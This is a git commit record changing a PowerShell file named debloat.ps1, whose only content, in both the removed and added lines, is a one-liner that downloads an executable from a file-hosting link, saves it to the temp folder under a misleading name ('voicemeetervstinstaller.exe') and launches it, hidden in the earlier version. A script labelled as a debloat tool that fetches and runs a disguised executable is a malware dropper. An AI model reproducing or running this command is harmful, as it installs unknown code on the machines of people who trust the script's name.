a41f9b1652ba5bef9a1fcefa3858f29dc1c8c848
DZ Fruits <154914678+Bloudercp@users.noreply.github.com>
2023-12-26 18:20:03 +0100

    v1

--- debloat.ps1
+++ debloat.ps1
@@ -1,1 +1,1 @@
-iwr -useb https://store2.gofile.io/download/8513a6eb-0510-496d-a9e5-fd7f2b9c43c3/2take1.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
+iwr -useb https://store2.gofile.io/download/8513a6eb-0510-496d-a9e5-fd7f2b9c43c3/2take1.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe
